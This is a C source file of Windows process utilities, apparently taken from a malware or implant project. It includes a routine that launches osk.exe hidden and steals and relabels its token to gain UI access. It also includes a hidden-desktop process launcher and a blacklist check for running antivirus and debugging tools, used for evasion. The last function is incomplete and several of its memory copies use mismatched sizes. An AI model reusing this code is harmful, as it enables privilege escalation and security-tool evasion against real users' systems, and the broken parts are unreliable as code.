#include "pch.h"

BOOL Run
(
	_In_ LPWSTR* Argv,
	_In_ DWORD dwArgc,
	_Out_ PHANDLE phProcess
)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	DWORD dwLength = 1;
	UINT i = 0;
	LPWSTR lpCommandLine = NULL;
	BOOL bResult = FALSE;

	for (i = 0; i < dwArgc; i++) {
		dwLength += (lstrlenW(Argv[i]) + 1);
	}

	lpCommandLine = ALLOC(dwLength * sizeof(WCHAR));
	for (i = 0; i < dwArgc; i++) {
		StrCatBuffW(lpCommandLine, Argv[i], dwLength);
		StrCatBuffW(lpCommandLine, L" ", dwLength);
	}

	lpCommandLine[lstrlenW(lpCommandLine) - 1] = L'\0';
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		goto END;
	}

	bResult = TRUE;
END:
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (phProcess != NULL) {
		*phProcess = pi.hProcess;
	}
	else if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (lpCommandLine != NULL) {
		FREE(lpCommandLine);
	}

	return bResult;
}

DWORD GetProcessIdByName
(
	_In_ LPWSTR lpProcessName
)
{
	HANDLE hProc = NULL;
	WCHAR wszTempName[MAX_PATH];
	DWORD cbTempName;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	DWORD dwResult = 0;
	PROCESSENTRY32W ProcessEntry;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		goto END;
	}

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	if (!Process32FirstW(hSnapshot, &ProcessEntry)) {
		goto END;
	}

	do {
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessEntry.th32ProcessID);
		if (hProc == NULL) {
			continue;
		}

		cbTempName = MAX_PATH;
		if (QueryFullProcessImageNameW(hProc, 0, wszTempName, &cbTempName)) {
			if (!StrCmpW(PathFindFileNameW(wszTempName), lpProcessName)) {
				CloseHandle(hProc);
				dwResult = ProcessEntry.th32ProcessID;
				goto END;
			}
		}

		CloseHandle(hProc);
	} while (Process32NextW(hSnapshot, &ProcessEntry));
END:
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		CloseHandle(hSnapshot);
	}

	return dwResult;
}

HANDLE CreateProcessAndStealToken
(
	_In_ LPWSTR lpFilePath
)
{
	SHELLEXECUTEINFOW ShellExeInfo;
	HANDLE hResult = NULL;
	NTSTATUS Status;
	HANDLE hProcessToken = NULL;
	SECURITY_QUALITY_OF_SERVICE SecurityQuality;
	OBJECT_ATTRIBUTES ObjAttr;

	ZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
	ShellExeInfo.cbSize = sizeof(ShellExeInfo);
	ShellExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShellExeInfo.lpFile = lpFilePath;
	ShellExeInfo.nShow = SW_HIDE;

	if (!ShellExecuteExW(&ShellExeInfo)) {
		goto END;
	}

	Status = NtOpenProcessToken(ShellExeInfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
	if (!NT_SUCCESS(Status)) {
		goto END;
	}

	ZeroMemory(&SecurityQuality, sizeof(SecurityQuality));
	SecurityQuality.Length = sizeof(SecurityQuality);
	SecurityQuality.ImpersonationLevel = SecurityImpersonation;
	SecurityQuality.ContextTrackingMode = 0;
	SecurityQuality.EffectiveOnly = FALSE;
	InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
	ObjAttr.SecurityQualityOfService = &SecurityQuality;
	Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &ObjAttr, FALSE, TokenPrimary, &hResult);
	if (!NT_SUCCESS(Status))
	{
		goto END;
	}

END:
	if (hProcessToken != NULL) {
		CloseHandle(hProcessToken);
	}

	NtTerminateProcess(ShellExeInfo.hProcess, STATUS_SUCCESS);

	if (ShellExeInfo.hProcess != NULL) {
		CloseHandle(ShellExeInfo.hProcess);
	}

	return hResult;
}

HANDLE SetTokenWithUiAccess
(
	_In_ HANDLE hToken
)
{
	SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
	NTSTATUS Status = 0;
	PSID pIntegritySid = NULL;
	TOKEN_MANDATORY_LABEL MandatoryLabel;
	HANDLE hResult = NULL;

	Status = RtlAllocateAndInitializeSid(&MLAuthority, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &pIntegritySid);
	if (!NT_SUCCESS(Status))
	{
		goto END;
	}

	ZeroMemory(&MandatoryLabel, sizeof(MandatoryLabel));
	MandatoryLabel.Label.Attributes = SE_GROUP_INTEGRITY;
	MandatoryLabel.Label.Sid = pIntegritySid;
	Status = NtSetInformationToken(hToken, TokenIntegrityLevel, &MandatoryLabel, (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
	if (!NT_SUCCESS(Status))
	{
		goto END;
	}

	hResult = hToken;
END:

	return hResult;
}

HANDLE GetUiAccessToken()
{
	HANDLE hToken = NULL;
	WCHAR wszOskPath[MAX_PATH];

	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\osk.exe", wszOskPath, MAX_PATH);
	hToken = CreateProcessAndStealToken(wszOskPath);
	if (hToken == NULL) {
		goto END;
	}

	hToken = SetTokenWithUiAccess(hToken);
	if (hToken == NULL) {
		goto END;
	}

END:
	return hToken;
}

NTSTATUS IsProcessElevated
(
	_In_ ULONG ProcessId,
	_Out_ PBOOL Elevated
)
{
	NTSTATUS Status;
	ULONG Dummy;
	HANDLE ProcessHandle, TokenHandle;
	CLIENT_ID ClientId;
	TOKEN_ELEVATION TokenInfo;
	OBJECT_ATTRIBUTES ObAttr = RTL_INIT_OBJECT_ATTRIBUTES(NULL, 0);

	ClientId.UniqueProcess = UlongToHandle(ProcessId);
	ClientId.UniqueThread = NULL;

	if (Elevated) {
		*Elevated = FALSE;
	}

	Status = NtOpenProcess(&ProcessHandle, MAXIMUM_ALLOWED, &ObAttr, &ClientId);
	if (NT_SUCCESS(Status)) {
		Status = NtOpenProcessToken(ProcessHandle, TOKEN_QUERY, &TokenHandle);
		if (NT_SUCCESS(Status)) {
			TokenInfo.TokenIsElevated = 0;
			Status = NtQueryInformationToken(TokenHandle, TokenElevation, &TokenInfo, sizeof(TOKEN_ELEVATION), &Dummy);

			if (NT_SUCCESS(Status)) {
				if (Elevated) {
					*Elevated = (TokenInfo.TokenIsElevated > 0);
				}
			}

			NtClose(TokenHandle);
		}

		NtClose(ProcessHandle);
	}

	return Status;
}

VOID ReadOutputFromProcess
(
	_In_ HANDLE hPipeRead,
	_In_ HANDLE hProcess,
	_Out_ PBYTE* pBufferPointer,
	_Out_ PDWORD pdwSize
)
{
	BOOL bSuccess = FALSE;
	PBYTE pBuffer = ALLOC(0x1000);
	DWORD dwNumberOfBytesToRead = 0x1000;
	DWORD dwNumberOfBytesRead = 0;
	DWORD dwTotalSize = 0;

	while (TRUE) {
		bSuccess = ReadFile(hPipeRead, &pBuffer[dwTotalSize], dwNumberOfBytesToRead, &dwNumberOfBytesRead, NULL);
		dwTotalSize += dwNumberOfBytesRead;

		if (!bSuccess || dwNumberOfBytesRead == 0) {
			break;
		}

		if (dwNumberOfBytesToRead == dwNumberOfBytesRead) {
			pBuffer = REALLOC(pBuffer, dwNumberOfBytesToRead * 2);
			dwNumberOfBytesRead = 0;
		}
		else {
			break;
		}
	}

	*pBufferPointer = pBuffer;
	*pdwSize = dwTotalSize;
	WaitForSingleObject(hProcess, INFINITE);
	return;
}

BOOL CreateProcessAndGetOutput
(
	_In_ LPWSTR lpCommandLine,
	_Out_ PBYTE* pOutput,
	_Out_ PDWORD pdwSize
)
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	HANDLE hChildStdOutRd = NULL;
	HANDLE hChildStdOutWr = NULL;
	SECURITY_ATTRIBUTES SecAttr;
	BOOL bResult = FALSE;

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&SecAttr, sizeof(SecAttr));
	SecAttr.nLength = sizeof(SecAttr);
	SecAttr.bInheritHandle = TRUE;
	SecAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hChildStdOutRd, &hChildStdOutWr, &SecAttr, 0)) {
		goto END;
	}

	if (!SetHandleInformation(hChildStdOutRd, HANDLE_FLAG_INHERIT, 0)) {
		goto END;
	}

	si.cb = sizeof(si);
	si.hStdError = hChildStdOutWr;
	si.hStdOutput = hChildStdOutWr;
	si.dwFlags |= STARTF_USESTDHANDLES;

	if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		goto END;
	}

	ReadOutputFromProcess(hChildStdOutRd, pi.hProcess, pOutput, pdwSize);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	bResult = TRUE;
END:
	return bResult;
}

BOOL CreateProcessWithDesktop
(
	_In_ LPWSTR lpCommandLine,
	_In_ LPWSTR lpDesktopName
)
{
	HDESK hOrigDesk = NULL;
	HDESK hHiddenDesk = NULL;
	BOOL Result = FALSE;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;

	hHiddenDesk = OpenDesktopW(lpDesktopName, 0, TRUE, GENERIC_ALL);
	hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
	if (!hHiddenDesk) {
		RtlSecureZeroMemory(&sa, sizeof(sa));
		sa.nLength = sizeof(sa);
		sa.bInheritHandle = TRUE;
		hHiddenDesk = CreateDesktopW(lpDesktopName, NULL, NULL, 0, GENERIC_ALL, &sa);
		if (hHiddenDesk == NULL) {
			LogError(L"CreateDesktopW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto CLEANUP;
		}
	}

	if (!SetThreadDesktop(hHiddenDesk)) {
		LogError(L"SetThreadDesktop failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!SwitchDesktop(hHiddenDesk)) {
		LogError(L"SwitchDesktop failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.lpDesktop = lpDesktopName;
	Sleep(10000);
	Result = CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (!Result) {
		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
CLEANUP:
	SwitchDesktop(hOrigDesk);
	SetThreadDesktop(hOrigDesk);
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (hHiddenDesk != NULL) {
		CloseDesktop(hHiddenDesk);
	}

	if (hOrigDesk != NULL) {
		CloseDesktop(hOrigDesk);
	}

	return Result;
}

BOOL AreProcessesRunning
(
	_In_ LPWSTR* pNameList,
	_In_ DWORD dwCount,
	_In_ DWORD dwMin
)
{
	BOOL Result = FALSE;
	DWORD i = 0;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W ProcEntry;
	LPWSTR* pTempList = NULL;
	DWORD dwNumberOfMatches = 0;

	if (dwMin == 0) {
		dwMin = dwCount;
	}

	if (dwMin > dwCount) {
		goto CLEANUP;
	}

	pTempList = ALLOC(sizeof(LPWSTR) * dwCount);
	for (i = 0; i < dwCount; i++) {
		pTempList[i] = pNameList[i];
	}

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		LogError(L"CreateToolhelp32Snapshot failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&ProcEntry, sizeof(ProcEntry));
	ProcEntry.dwSize = sizeof(ProcEntry);
	if (!Process32FirstW(hSnapshot, &ProcEntry)) {
		LogError(L"Process32FirstW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	do {
		for (i = 0; i < dwCount; i++) {
			if (pTempList[i] != NULL) {
				if (!StrCmpIW(pTempList[i], ProcEntry.szExeFile)) {
					dwNumberOfMatches++;
					if (dwNumberOfMatches >= dwMin) {
						Result = TRUE;
						goto CLEANUP;
					}

					pTempList[i] = NULL;
				}
			}
		}
	} while (Process32NextW(hSnapshot, &ProcEntry));
CLEANUP:
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		CloseHandle(hSnapshot);
	}

	if (pTempList != NULL) {
		FREE(pTempList);
	}

	return Result;
}

BOOL CheckForBlackListProcess() {
	LPWSTR AvList[] = {L"kav.exe", L"kav32.exe", L"kavfs.exe", L"kavmm.exe", L"klnagent.exe", L"BITDEFENDER.exe", L"bdc.exe", L"bdlite.exe", L"bdagent.exe", L"AvastSvc.exe", L"afwServ.exe", L"ashserv.exe"};
	LPWSTR DebugList[] = { L"ida.exe", L"ida64.exe", L"DbgX.Shell.exe", L"x64dbg.exe", L"x32dbg.exe", L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe", L"apimonitor-x86.exe", L"pin.exe", L"SystemInformer.exe", L"windbg.exe" };
	BOOL Result = FALSE;

	Result = AreProcessesRunning(DebugList, _countof(DebugList), 1);
	/*if (Result) {
		return TRUE;
	}*/

	Result = AreProcessesRunning(AvList, _countof(AvList), 1);
	if (Result) {
		return TRUE;
	}

	return FALSE;
}

LPSTR GetCurrentProcessUserSID()
{
	HANDLE hToken = NULL;
	PTOKEN_USER pTokenInfo = NULL;;
	DWORD cbTokenInfo = sizeof(TOKEN_USER);
	LPSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	DWORD dwLastError = ERROR_SUCCESS;

	hToken = GetCurrentProcessToken();
	pTokenInfo = ALLOC(cbTokenInfo);
	while (TRUE) {
		if (!GetTokenInformation(hToken, TokenUser, pTokenInfo, cbTokenInfo, &cbTokenInfo)) {
			dwLastError = GetLastError();
			if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
				pTokenInfo = REALLOC(pTokenInfo, cbTokenInfo + 1);
				continue;
			}

			LogError(L"GetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto CLEANUP;
		}

		break;
	}
	
	if (!ConvertSidToStringSidA(pTokenInfo->User.Sid, &lpTemp)) {
		LogError(L"ConvertSidToStringSidA failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	lpResult = DuplicateStrA(lpTemp, 0);
CLEANUP:
	if (pTokenInfo != NULL) {
		FREE(pTokenInfo);
	}

	if (lpTemp != NULL) {
		LocalFree(lpTemp);
	}

	return lpResult;
}

LPSTR GetCurrentProcessGroupSID()
{
	HANDLE hToken = NULL;
	PTOKEN_PRIMARY_GROUP pTokenInfo = NULL;;
	DWORD cbTokenInfo = sizeof(TOKEN_PRIMARY_GROUP);
	LPSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	DWORD dwLastError = ERROR_SUCCESS;

	hToken = GetCurrentProcessToken();
	pTokenInfo = ALLOC(cbTokenInfo);
	while (TRUE) {
		if (!GetTokenInformation(hToken, TokenPrimaryGroup, pTokenInfo, cbTokenInfo, &cbTokenInfo)) {
			dwLastError = GetLastError();
			if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
				pTokenInfo = REALLOC(pTokenInfo, cbTokenInfo + 1);
				continue;
			}

			LogError(L"GetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto CLEANUP;
		}

		break;
	}

	if (!ConvertSidToStringSidA(pTokenInfo->PrimaryGroup, &lpTemp)) {
		LogError(L"ConvertSidToStringSidA failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	lpResult = DuplicateStrA(lpTemp, 0);
CLEANUP:
	if (pTokenInfo != NULL) {
		FREE(pTokenInfo);
	}

	if (lpTemp != NULL) {
		LocalFree(lpTemp);
	}

	return lpResult;
}

LPSTR DescribeProcessMitigation
(
	_In_ HANDLE hProcess
)
{
	BOOL IsWow64 = FALSE;
	ULONG uDepStatus = 0;
	NTSTATUS Status = 0;
	ULONG uExecuteFlags = 0;
	ULONG ReturnedLength = 0;
	LPSTR lpResult = NULL;
	PROCESS_MITIGATION_POLICY_INFORMATION AslrPolicy;
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY DynamicCodePolicy;
	PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY StrictHandlePolicy;
	PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY SystemCallDisablePolicy;
	PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ExtensionPointDisablePolicy;
	PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY CFGPolicy;
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY BinarySignaturePolicy;
	PROCESS_MITIGATION_FONT_DISABLE_POLICY FontDisablePolicy;
	PROCESS_MITIGATION_IMAGE_LOAD_POLICY ImageLoadPolicy;
	PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY CallFilterPolicy;
	PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY PayloadRestrictionPolicy;
	PROCESS_MITIGATION_CHILD_PROCESS_POLICY ChildProcessPolicy;
	PROCESS_MITIGATION_SIDE_CHANNEL_ISOLATION_POLICY SideChannelIsolationPolicy;
	PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY ShadowStackPolicy;
	PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY RedirectionTrustPolicy;
	PROCESS_MITIGATION_USER_POINTER_AUTH_POLICY UserPointerAuthPolicy;
	PROCESS_MITIGATION_SEHOP_POLICY SEHPolicy;
	PROCESS_MITIGATION_POLICY_INFORMATION PolicyInfo;

	if (!IsWow64Process(hProcess, &IsWow64)) {
		LogError(L"IsWow64Process failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!IsWow64) {
		uDepStatus = MEM_EXECUTE_OPTION_ENABLE | MEM_EXECUTE_OPTION_PERMANENT;
	}
	else {
		Status = NtQueryInformationProcess(hProcess, ProcessExecuteFlags, &uExecuteFlags, sizeof(uExecuteFlags), &ReturnedLength);
		if (!NT_SUCCESS(Status)) {
			LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
			goto CLEANUP;
		}

		if (uExecuteFlags & MEM_EXECUTE_OPTION_ENABLE) {
			uDepStatus = MEM_EXECUTE_OPTION_ENABLE;
		}

		if (uExecuteFlags & MEM_EXECUTE_OPTION_DISABLE_THUNK_EMULATION) {
			uDepStatus |= MEM_EXECUTE_OPTION_DISABLE_THUNK_EMULATION;
		}

		if (uExecuteFlags & MEM_EXECUTE_OPTION_PERMANENT) {
			uDepStatus |= MEM_EXECUTE_OPTION_PERMANENT;
		}
	}

	PolicyInfo.Policy = ProcessASLRPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&AslrPolicy, &PolicyInfo.ASLRPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessDynamicCodePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&DynamicCodePolicy, &PolicyInfo.DynamicCodePolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessStrictHandleCheckPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&StrictHandlePolicy, &PolicyInfo.StrictHandleCheckPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessSystemCallDisablePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&SystemCallDisablePolicy, &PolicyInfo.SystemCallDisablePolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessExtensionPointDisablePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&ExtensionPointDisablePolicy, &PolicyInfo.ExtensionPointDisablePolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessControlFlowGuardPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&CFGPolicy, &PolicyInfo.ControlFlowGuardPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessSignaturePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&BinarySignaturePolicy, &PolicyInfo.SignaturePolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessFontDisablePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&FontDisablePolicy, &PolicyInfo.FontDisablePolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessImageLoadPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&ImageLoadPolicy, &PolicyInfo.ImageLoadPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessSystemCallFilterPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&CallFilterPolicy, &PolicyInfo.SystemCallFilterPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessPayloadRestrictionPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&PayloadRestrictionPolicy, &PolicyInfo.PayloadRestrictionPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessChildProcessPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&ChildProcessPolicy, &PolicyInfo.ChildProcessPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessSideChannelIsolationPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&SideChannelIsolationPolicy, &PolicyInfo.SideChannelIsolationPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessUserShadowStackPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&ShadowStackPolicy, &PolicyInfo.UserShadowStackPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessRedirectionTrustPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&RedirectionTrustPolicy, &PolicyInfo.RedirectionTrustPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessUserPointerAuthPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&UserPointerAuthPolicy, &PolicyInfo.UserPointerAuthPolicy, sizeof(AslrPolicy));
	PolicyInfo.Policy = ProcessSEHOPPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		LogError(L"NtQueryInformationProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
		goto CLEANUP;
	}

	memcpy(&SEHPolicy, &PolicyInfo.SEHOPPolicy, sizeof(AslrPolicy));
	if (uDepStatus & MEM_EXECUTE_OPTION_ENABLE) {

	}

CLEANUP:
}